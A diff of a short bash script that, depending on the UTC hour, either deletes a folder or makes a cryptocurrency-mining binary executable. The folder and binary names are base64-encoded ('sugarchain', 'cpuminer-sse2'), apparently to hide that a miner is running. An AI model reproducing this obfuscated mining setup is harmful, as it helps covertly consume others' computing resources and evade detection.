@@ -6,15 +6,17 @@ jam2digit=$(date -u +%H)
 jam1digit=$((10#$jam2digit))
 echo "sekarang $jam2digit $jam1digit "
 ketentuan1=1
-ketentuan2=7
-ketentuan3=13
-ketentuan4=19
-if [ $jam1digit -eq $ketentuan1 ] || [ $jam1digit -eq $ketentuan2 ] || [ $jam1digit -eq $ketentuan3 ] || [ $jam1digit -eq $ketentuan4 ]
+ketentuan2=5
+ketentuan3=9
+ketentuan4=13
+ketentuan5=17
+ketentuan6=21
+if [ $jam1digit -eq $ketentuan1 ] || [ $jam1digit -eq $ketentuan2 ] || [ $jam1digit -eq $ketentuan3 ] || [ $jam1digit -eq $ketentuan4 ] || [ $jam1digit -eq $ketentuan5 ] || [ $jam1digit -eq $ketentuan6 ]
 then
-  echo "sama dengan $ketentuan1 $ketentuan2 $ketentuan3 $ketentuan4  "
+  echo "sama dengan $ketentuan1 $ketentuan2 $ketentuan3 $ketentuan4 $ketentuan5 $ketentuan6  "
   cd .. && rm -rf c3VnYXJjaGFpbg
 else
-  echo "enggak $ketentuan1 $ketentuan2 $ketentuan3 $ketentuan4 "
+  echo "enggak $ketentuan1 $ketentuan2 $ketentuan3 $ketentuan4 $ketentuan5 $ketentuan6 "
   #while [ 1 ]; do
   #chmod +x cpuminer-sse2
   chmod +x Y3B1bWluZXItc3NlMg
